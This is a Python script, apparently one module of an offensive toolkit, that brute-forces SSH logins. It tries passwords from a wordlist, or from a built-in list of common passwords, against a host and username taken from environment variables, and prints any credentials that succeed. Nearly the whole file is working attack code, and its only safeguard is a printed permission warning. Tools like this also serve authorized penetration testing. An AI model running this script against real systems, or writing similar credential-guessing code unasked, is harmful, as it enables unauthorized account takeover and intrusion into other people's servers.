#!/usr/bin/env python3
"""
Brute SSH Module
SSH brute-force tool with wordlist support
"""

import os
import sys
import time

try:
    import paramiko
except ImportError:
    print("Error: paramiko not installed. Install with: pip install paramiko")
    sys.exit(1)

def try_ssh(host, port, username, password, timeout):
    """Attempt SSH login"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=timeout)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False

def main():
    host = os.getenv('ARG_HOST')
    port = int(os.getenv('ARG_PORT', '22'))
    wordlist = os.getenv('ARG_WORDLIST')
    username = os.getenv('ARG_USERNAME')
    timeout = int(os.getenv('ARG_TIMEOUT', '5'))
    
    if not host or not username or not wordlist:
        print("Error: host, username, and wordlist required")
        sys.exit(1)
    
    print(f"[!] WARNING: Only use on systems you own or have permission to test")
    print(f"\n[*] SSH Brute-Force")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Username: {username}")
    print(f"[*] Wordlist: {wordlist}")
    
    if not os.path.exists(wordlist):
        print(f"[!] Wordlist not found: {wordlist}")
        print(f"[*] Creating sample wordlist...")
        passwords = ["password", "admin", "123456", "qwerty", "letmein"]
    else:
        with open(wordlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Testing {len(passwords)} passwords...\n")
    
    found = False
    start_time = time.time()
    
    for i, password in enumerate(passwords, 1):
        print(f"[*] Attempt {i}/{len(passwords)}: {password[:20]}", end='\r')
        
        if try_ssh(host, port, username, password, timeout):
            elapsed = time.time() - start_time
            print(f"\n\n[+] SUCCESS! Credentials found:")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password}")
            print(f"[+] Time: {elapsed:.2f}s")
            found = True
            break
    
    if not found:
        elapsed = time.time() - start_time
        print(f"\n\n[!] No valid credentials found")
        print(f"[*] Tested {len(passwords)} passwords in {elapsed:.2f}s")
    
    print("\n[+] Complete")

if __name__ == "__main__":
    main()
